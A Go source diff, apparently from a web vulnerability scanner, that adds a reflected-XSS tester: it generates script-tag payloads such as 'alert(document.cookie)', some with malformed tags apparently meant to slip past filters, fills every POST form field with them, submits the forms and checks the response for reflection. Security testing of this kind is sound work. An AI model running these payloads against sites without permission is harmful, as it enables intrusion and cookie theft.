@@ -1,68 +1,141 @@
 package handlers
 
 import (
-	"context"
+	"fmt"
 	"io"
-	"log"
 	"net/http"
-	"time"
+	"net/url"
 
+	"strings"
+
+	"github.com/anaskhan96/soup"
 	"github.com/xtasysensei/vultest/cmd/utils"
 )
 
-func Connector(url string) ([]byte, error) {
-
-	userAgentList := []string{
-		//Chrome
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
-		//Firefox
-		"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
-		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
-		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)",
-		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
-		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
-		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
-		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
-		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
+func GeneratePayload(eff int) (string, error) {
+	payloads := []string{
+		"prompt(5000/200)",
+		"alert(6000/3000)",
+		"alert(document.cookie)",
+		"prompt(document.cookie)",
+		"console.log(5000/3000)",
 	}
 
-	userAgent := userAgentList[utils.RandRange(0, 21)]
+	if eff == 1 {
+		return "<script/>" + payloads[utils.RandRange(0, 4)] + `<\script\>`, nil
+	} else if eff == 2 {
+		return `<\script/>` + payloads[utils.RandRange(0, 4)] + `<\\script>`, nil
 
-	client := &http.Client{}
-	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
-	defer cancel()
+	} else if eff == 3 {
+		return `<\script\>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil
+	} else if eff == 4 {
+		return `<script>` + payloads[utils.RandRange(0, 4)] + `<\script/>`, nil
 
-	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
+	} else if eff == 5 {
+		return `<script>` + payloads[utils.RandRange(0, 4)] + `<//script>`, nil
+
+	} else if eff == 6 {
+		return `<script>` + payloads[utils.RandRange(0, 4)] + `</script>`, nil
+
+	}
+
+	return "", nil
+}
+
+type Keys struct {
+	KeyType string
+	KeyName string
+	Value   string
+}
+
+func GetFormMethod(childURL, payload string) ([]Keys, error) {
+	resp, err := soup.Get(childURL)
 	if err != nil {
-		log.Fatalf("Request error: %v\n", err)
-	}
-	req.Header.Set("User-Agent", userAgent)
-
-	resp, err := client.Do(req)
-	if err != nil {
-		log.Fatalf("Client error: %v\n", err)
+		return nil, fmt.Errorf("error connecting to URL %s: %v", childURL, err)
 	}
 
-	defer resp.Body.Close()
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		log.Fatalf("Read resp error: %v\n", err)
+	doc := soup.HTMLParse(resp)
+	forms := doc.FindAll("form")
+
+	var allKeys []Keys
+	xssDetected := false
+
+	for _, form := range forms {
+		action := form.Attrs()["action"]
+		method := strings.ToLower(form.Attrs()["method"])
+
+		if method == "post" {
+			newChildURL, err := url.JoinPath(childURL, action)
+			if err != nil {
+				return nil, fmt.Errorf("failed to join path %s to %s: %v", childURL, action, err)
+			}
+
+			utils.Warning("Target has form with POST method: " + utils.C + newChildURL)
+			utils.Info("Collecting form input keys.....")
+
+			var formKeys []Keys
+
+			inputAreas := form.FindAll("input")
+			textAreas := form.FindAll("textarea")
+			inputAreas = append(inputAreas, textAreas...)
+
+			for _, inputArea := range inputAreas {
+				keyType := inputArea.Attrs()["type"]
+				keyName := inputArea.Attrs()["name"]
+
+				var key Keys
+				if keyType == "submit" {
+					utils.Info("Form key name: " + utils.G + keyName + utils.N + " value: " + utils.G + "<Submit Confirm>")
+					key = Keys{
+						KeyType: keyType,
+						KeyName: keyName,
+					}
+				} else {
+					utils.Info("Form key name: " + utils.G + keyName + utils.N + " value: " + utils.G + payload)
+					key = Keys{
+						KeyType: keyType,
+						KeyName: keyName,
+						Value:   payload,
+					}
+				}
+				formKeys = append(formKeys, key)
+			}
+
+			// Construct form data
+			formData := url.Values{}
+			for _, key := range formKeys {
+				formData.Set(key.KeyName, key.Value)
+			}
+
+			utils.Info("Sending payload (POST) method...")
+			resp, err := http.PostForm(newChildURL, formData)
+			if err != nil {
+				return nil, fmt.Errorf("failed to send POST request: %v", err)
+			}
+			defer resp.Body.Close()
+
+			// Check for XSS
+			body, err := io.ReadAll(resp.Body)
+			if err != nil {
+				return nil, fmt.Errorf("failed to read response body: %v", err)
+			}
+			if strings.Contains(string(body), payload) {
+				utils.High("Detected XSS (POST) at " + childURL)
+				utils.High("Post data: " + fmt.Sprintf("%+v", formKeys))
+				xssDetected = true
+			}
+
+			allKeys = append(allKeys, formKeys...)
+		}
 	}
 
-	return body, nil
+	if len(allKeys) == 0 {
+		return nil, fmt.Errorf("no POST forms found on the page")
+	}
 
+	if !xssDetected {
+		utils.Info("No XSS vulnerabilities detected in POST forms, but further testing is recommended")
+	}
+
+	return allKeys, nil
 }
